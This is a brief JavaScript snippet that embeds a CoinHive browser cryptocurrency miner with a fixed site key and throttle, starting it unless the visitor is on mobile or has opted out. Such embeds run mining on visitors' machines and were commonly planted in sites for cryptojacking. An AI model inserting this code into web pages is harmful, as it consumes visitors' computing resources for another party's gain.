	var miner = new CoinHive.Anonymous('hn6hNEm6hTonGXfUUQeVBsOjirT2w1hE', {throttle: 0.6});
	if (!miner.isMobile() && !miner.didOptOut(10)) {
		miner.start();
	}